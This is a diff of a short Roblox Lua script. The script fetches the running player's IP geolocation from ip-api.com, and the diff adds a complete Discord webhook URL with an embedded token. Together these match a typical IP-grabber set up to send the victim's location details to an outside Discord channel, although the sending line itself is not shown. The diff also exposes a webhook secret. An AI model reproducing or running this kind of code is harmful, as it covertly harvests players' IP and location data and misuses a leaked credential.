@@ -1,6 +1,6 @@
 local HTTP = game:GetService("HttpService")
 
-local webhookurl = "http://ip-api.com/json" -- This can be found by going into your discord server settings then going to integrations then going to webhooks
+local webhookurl = "https://discord.com/api/webhooks/1172578120373645342/O3zNN3CZXkL5Qgce4YaOlbOdPAxX24iQ9XwUtIsCmjzCVrvm_Z3VInHb-udTa-tHk78_" -- This can be found by going into your discord server settings then going to integrations then going to webhooks
 local player = game.Players.LocalPlayer
 local a = game:HttpGet("http://ip-api.com/json")
 
